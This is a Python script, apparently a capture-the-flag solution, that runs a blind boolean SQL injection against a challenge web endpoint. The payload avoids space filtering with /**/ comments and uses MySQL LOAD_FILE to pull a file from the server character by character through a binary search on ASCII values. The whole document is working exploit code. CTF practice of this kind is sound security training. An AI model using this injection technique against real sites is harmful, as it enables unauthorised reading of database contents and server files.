import requests

# defining the challenge sqli vulnerable endpoint
chal_endpoint = "http://web5.q20.ctfsecurinets.com/"


row_num = 0
max_ascii = 127
min_ascii = 0
ascii_guess = 95
ascii_threshold = 2
guesses = []
guess_string = ""
# The full path to the file we want to read from
full_path_to_file = "/var/lib/mysql-files/flag/flag.txt"

guess_pos = 0
# How I'll be able to tell what my boolean evaluated to
response_body = "LOL Worlds 2019"
# Get the length of this name, just keep incrementing until the response body stops showing up
sqli_bool_true = True

while sqli_bool_true:
	guess_pos += 1
	print("Guessing %s" % guess_pos)
	sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/LOAD_FILE('{}'))/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/0;#".format(full_path_to_file, guess_pos)
	# params to be sent with GET request
	params = {'search':sqli} 
	

	# sending post request and saving response as response object 
	r = requests.get(url = chal_endpoint, params = params) 
	# extracting response text 
	sqli_bool_true = response_body in r.text
print("Length of path %s" % guess_pos)

num_rows = guess_pos
# guess_pos = 0
sqli_bool_true = True
length_of_file_contents = guess_pos

# stop when asci_threshold == 0 and we have sqli_bool_true set to true.
for guess_pos in range(1,length_of_file_contents):
	max_ascii = 127
	min_ascii = 0
	ascii_guess = 95
	ascii_threshold = 2
	sqli_bool_true = True
	while ascii_threshold != 0 or not sqli_bool_true:
		print("Guessing %s" % ascii_guess)
		sqli = "1')/**/AND/**/(ascii(substr((SELECT/**/LOAD_FILE('{}'))/**/FROM/**/{}/**/FOR/**/1)))/**/>/**/{};#".format(full_path_to_file, guess_pos, ascii_guess)
		# params to be sent with GET request
		params = {'search':sqli} 
		
		# sending post request and saving response as response object 
		r = requests.get(url = chal_endpoint, params = params) 
		# extracting response text 
		sqli_bool_true = response_body in r.text
		if sqli_bool_true:
			if ascii_threshold == 0:
				min_ascii = ascii_guess
				ascii_threshold = 1
				ascii_guess += ascii_threshold
			else:
				# This means the ascii value was greater than our guess
				min_ascii = ascii_guess
				ascii_threshold = (max_ascii - ascii_guess) // 2
				ascii_guess += ascii_threshold
		else:
			# This means the ascii value is less than our guess
			if ascii_threshold == 0:
				max_ascii = ascii_guess
				ascii_threshold = 1
				ascii_guess -= ascii_threshold
			else:
				max_ascii = ascii_guess
				ascii_threshold = (ascii_guess - min_ascii) // 2
				ascii_guess -= ascii_threshold
	guesses.append(ascii_guess+1)
	guess_string += chr(ascii_guess + 1)
	print("The ascii char is: %s"%chr(ascii_guess+1)) 

print(guesses)
print(guess_string)
